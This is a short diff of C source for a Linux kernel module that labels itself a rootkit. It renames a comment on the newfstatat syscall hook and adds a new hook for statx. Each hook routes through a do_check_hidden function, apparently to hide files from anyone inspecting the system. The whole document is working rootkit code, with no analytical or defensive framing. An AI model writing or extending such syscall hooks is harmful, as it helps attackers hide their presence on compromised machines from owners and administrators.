@@ -136,7 +136,7 @@ SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename
     return do_check_hidden(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
 }
 
-// sys_stat syscall hook handler
+// sys_newfstatat syscall hook handler
 SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, struct stat __user *, p_statbuf, int, i32_flag)
 {
@@ -144,4 +144,15 @@ SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const c
 
     return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename,
                            i32_flag | AT_NO_AUTOMOUNT);
+}
+
+// sys_statx syscall hook handler
+SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user *, s_filename,
+                      unsigned int, ui32_flags, unsigned int, ui32_mask, struct statx __user *,
+                      p_buffer)
+{
+    pr_info("[ROOTKIT] statx(%d, %p, %u, %u, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
+            p_buffer);
+
+    return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags | AT_NO_AUTOMOUNT);
 }
